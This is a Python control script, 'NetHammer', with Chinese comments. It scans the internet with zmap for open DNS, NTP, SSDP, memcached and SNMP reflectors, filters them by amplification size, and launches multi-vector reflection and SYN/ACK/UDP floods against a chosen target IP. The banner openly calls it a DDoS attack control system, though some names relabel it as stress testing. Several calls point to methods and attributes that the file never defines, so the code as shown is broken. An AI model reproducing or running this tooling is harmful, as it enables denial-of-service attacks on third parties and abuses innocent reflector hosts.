#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NetHammer Master Controller
集成化网络压力测试控制系统
"""

import os
import sys
import time
import json
import threading
import subprocess
import argparse
from datetime import datetime
import signal

class NetHammerController:
    def __init__(self):
        self.test_processes = []
        self.scan_processes = []
        self.config = {
            'test_tools_path': './attack_tools/',
            'scan_tools_path': './scan_filter_attack/',
            'reflector_lists_path': './reflector_lists/',
            'logs_path': './logs/'
        }
        self.ensure_directories()
        
    def ensure_directories(self):
        """确保必要目录存在"""
        for path in self.config.values():
            if not os.path.exists(path):
                os.makedirs(path)
    
    def log(self, message, level="INFO"):
        """日志记录"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] [{level}] {message}"
        print(log_message)
        
        # 写入日志文件
        log_file = os.path.join(self.config['logs_path'], f"nethammer_{datetime.now().strftime('%Y%m%d')}.log")
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(log_message + '\n')
    
    def check_root_privileges(self):
        """检查root权限"""
        if os.geteuid() != 0:
            self.log("错误: 需要root权限运行原始socket攻击", "ERROR")
            return False
        return True
    
    def scan_reflectors(self, protocol, output_file, ip_range=None):
        """扫描反射服务器"""
        self.log(f"开始扫描 {protocol} 反射服务器...")
        
        probe_files = {
            'dns': 'dns_53.pkt',
            'ntp': 'ntp_123_monlist.pkt', 
            'ssdp': 'upnp_1900.pkt',
            'memcached': 'memcache_11211.pkt',
            'snmp': 'snmp1_161.pkt'
        }
        
        ports = {
            'dns': 53,
            'ntp': 123,
            'ssdp': 1900,
            'memcached': 11211,
            'snmp': 161
        }
        
        if protocol not in probe_files:
            self.log(f"不支持的协议: {protocol}", "ERROR")
            return False
        
        probe_file = os.path.join(self.config['scan_tools_path'], 'zmap_udp_probes', probe_files[protocol])
        
        if not os.path.exists(probe_file):
            self.log(f"探针文件不存在: {probe_file}", "ERROR")
            return False
        
        # 构造zmap扫描命令
        if ip_range:
            cmd = f"zmap -p {ports[protocol]} --probe-args=file:{probe_file} -o {output_file} {ip_range}"
        else:
            cmd = f"zmap -p {ports[protocol]} --probe-args=file:{probe_file} -o {output_file}"
        
        self.log(f"执行扫描命令: {cmd}")
        
        try:
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.scan_processes.append(process)
            return True
        except Exception as e:
            self.log(f"扫描启动失败: {e}", "ERROR")
            return False
    
    def filter_reflectors(self, protocol, input_file, output_file, min_bytes=100):
        """过滤有效反射服务器"""
        self.log(f"开始过滤 {protocol} 反射服务器...")
        
        filter_script = os.path.join(self.config['scan_tools_path'], 'protocol_filters', 'filter.py')
        
        if not os.path.exists(filter_script):
            self.log(f"过滤脚本不存在: {filter_script}", "ERROR")
            return False
        
        cmd = f"python3 {filter_script} {input_file} {output_file} {protocol} {min_bytes} '[ip] [bytes]'"
        
        self.log(f"执行过滤命令: {cmd}")
        
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                self.log(f"过滤完成: {output_file}")
                return True
            else:
                self.log(f"过滤失败: {result.stderr}", "ERROR")
                return False
        except Exception as e:
            self.log(f"过滤执行失败: {e}", "ERROR")
            return False
    
    def launch_amplification_test(self, test_type, target_ip, target_port, reflector_file, threads=50, duration=300):
        """发起放大压力测试"""
        if not self.check_root_privileges():
            return False
        
        test_tools = {
            'dns': 'DNS',
            'ntp': 'ntp',
            'ssdp': 'ssdp',
            'memcached': 'memc',
            'udp': 'udp',
            'syn': 'syn',
            'ack': 'ack'
        }

        if test_type not in test_tools:
            self.log(f"不支持的测试类型: {test_type}", "ERROR")
            return False

        tool_path = os.path.join(self.config['test_tools_path'], test_tools[test_type])
        
        if not os.path.exists(tool_path):
            self.log(f"测试工具不存在: {tool_path}", "ERROR")
            return False

        # 构造测试命令
        if test_type in ['dns']:
            cmd = f"{tool_path} {target_ip} {target_port} {reflector_file} {threads} {duration}"
        elif test_type in ['ntp', 'ssdp', 'memcached']:
            cmd = f"{tool_path} {target_ip} {target_port} {reflector_file} {threads} -1 {duration}"
        else:
            cmd = f"{tool_path} {target_ip} {target_port} {threads} {duration}"
        
        self.log(f"启动 {test_type.upper()} 压力测试: {target_ip}:{target_port}")
        self.log(f"执行命令: {cmd}")

        try:
            process = subprocess.Popen(cmd, shell=True)
            self.test_processes.append({
                'type': test_type,
                'process': process,
                'target': f"{target_ip}:{target_port}",
                'start_time': time.time()
            })
            return True
        except Exception as e:
            self.log(f"测试启动失败: {e}", "ERROR")
            return False
    
    def launch_multi_vector_test(self, target_ip, target_port, test_config, duration=300):
        """发起多重压力测试"""
        self.log(f"启动多重压力测试: {target_ip}:{target_port}")

        success_count = 0

        for test_type, config in test_config.items():
            if config.get('enabled', False):
                reflector_file = config.get('reflector_file')
                threads = config.get('threads', 50)

                if self.launch_amplification_test(test_type, target_ip, target_port,
                                                  reflector_file, threads, duration):
                    success_count += 1
                    time.sleep(2)  # 间隔启动

        self.log(f"多重测试启动完成，成功启动 {success_count} 个测试向量")
        return success_count > 0
    
    def stop_all_tests(self):
        """停止所有压力测试"""
        self.log("停止所有测试进程...")

        for test_info in self.test_processes:
            try:
                process = test_info['process']
                if process.poll() is None:  # 进程仍在运行
                    process.terminate()
                    time.sleep(1)
                    if process.poll() is None:
                        process.kill()
                    self.log(f"已停止 {test_info['type']} 测试")
            except Exception as e:
                self.log(f"停止测试进程失败: {e}", "ERROR")

        self.test_processes.clear()
    
    def show_attack_status(self):
        """显示攻击状态"""
        if not self.attack_processes:
            self.log("当前没有运行的攻击")
            return
        
        self.log("=== 攻击状态 ===")
        for i, attack_info in enumerate(self.attack_processes):
            process = attack_info['process']
            status = "运行中" if process.poll() is None else "已停止"
            runtime = int(time.time() - attack_info['start_time'])
            
            self.log(f"{i+1}. {attack_info['type'].upper()} -> {attack_info['target']} "
                    f"[{status}] 运行时间: {runtime}秒")
    
    def auto_scan_and_attack(self, target_ip, target_port, protocols=['dns', 'ntp', 'ssdp'], duration=300):
        """自动扫描和攻击流程"""
        self.log("=== 启动自动扫描和攻击流程 ===")
        
        attack_config = {}
        
        for protocol in protocols:
            self.log(f"处理 {protocol} 协议...")
            
            # 扫描
            raw_file = os.path.join(self.config['reflector_lists_path'], f"{protocol}_raw.txt")
            filtered_file = os.path.join(self.config['reflector_lists_path'], f"{protocol}_filtered.txt")
            
            # 如果已有过滤后的文件且不超过24小时，直接使用
            if os.path.exists(filtered_file):
                file_age = time.time() - os.path.getmtime(filtered_file)
                if file_age < 86400:  # 24小时
                    self.log(f"使用现有的 {protocol} 反射器列表")
                    attack_config[protocol] = {
                        'enabled': True,
                        'reflector_file': filtered_file,
                        'threads': 50
                    }
                    continue
            
            # 扫描新的反射器
            if self.scan_reflectors(protocol, raw_file):
                self.log(f"等待 {protocol} 扫描完成...")
                time.sleep(60)  # 等待扫描
                
                # 过滤反射器
                min_bytes = {'dns': 100, 'ntp': 400, 'ssdp': 200}.get(protocol, 100)
                if self.filter_reflectors(protocol, raw_file, filtered_file, min_bytes):
                    attack_config[protocol] = {
                        'enabled': True,
                        'reflector_file': filtered_file,
                        'threads': 50
                    }
        
        # 启动攻击
        if attack_config:
            self.launch_multi_vector_attack(target_ip, target_port, attack_config, duration)
        else:
            self.log("没有可用的攻击向量", "ERROR")

def signal_handler(signum, frame):
    """信号处理器"""
    print("\n收到停止信号，正在清理...")
    controller.stop_all_attacks()
    sys.exit(0)

def main():
    global controller
    
    parser = argparse.ArgumentParser(description='NetHammer Master Controller')
    parser.add_argument('--target', required=True, help='目标IP地址')
    parser.add_argument('--port', type=int, default=80, help='目标端口 (默认: 80)')
    parser.add_argument('--duration', type=int, default=300, help='攻击持续时间(秒) (默认: 300)')
    parser.add_argument('--protocols', nargs='+', default=['dns', 'ntp', 'ssdp'], 
                       help='攻击协议 (默认: dns ntp ssdp)')
    parser.add_argument('--auto', action='store_true', help='自动扫描和攻击模式')
    parser.add_argument('--scan-only', action='store_true', help='仅扫描模式')
    
    args = parser.parse_args()
    
    # 注册信号处理器
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    controller = NetHammerController()
    
    print("=" * 60)
    print("    NetHammer Master Controller v1.0")
    print("    集成化DDoS攻击控制系统")
    print("=" * 60)
    
    if args.auto:
        # 自动模式
        controller.auto_scan_and_attack(args.target, args.port, args.protocols, args.duration)
        
        # 监控攻击状态
        try:
            while True:
                time.sleep(30)
                controller.show_attack_status()
        except KeyboardInterrupt:
            pass
    
    elif args.scan_only:
        # 仅扫描模式
        for protocol in args.protocols:
            output_file = f"{protocol}_servers.txt"
            controller.scan_reflectors(protocol, output_file)
    
    else:
        # 交互模式
        print("\n可用命令:")
        print("1. scan <protocol> - 扫描反射服务器")
        print("2. attack <type> <reflector_file> - 启动攻击")
        print("3. multi - 启动多重攻击")
        print("4. status - 显示攻击状态")
        print("5. stop - 停止所有攻击")
        print("6. quit - 退出程序")
        
        while True:
            try:
                cmd = input("\nNetHammer> ").strip().split()
                if not cmd:
                    continue
                
                if cmd[0] == 'quit':
                    break
                elif cmd[0] == 'scan' and len(cmd) > 1:
                    controller.scan_reflectors(cmd[1], f"{cmd[1]}_servers.txt")
                elif cmd[0] == 'attack' and len(cmd) > 2:
                    controller.launch_amplification_attack(cmd[1], args.target, args.port, cmd[2])
                elif cmd[0] == 'status':
                    controller.show_attack_status()
                elif cmd[0] == 'stop':
                    controller.stop_all_attacks()
                else:
                    print("无效命令")
            
            except KeyboardInterrupt:
                break
    
    controller.stop_all_attacks()
    print("\nNetHammer Controller 已退出")

if __name__ == "__main__":
    main()
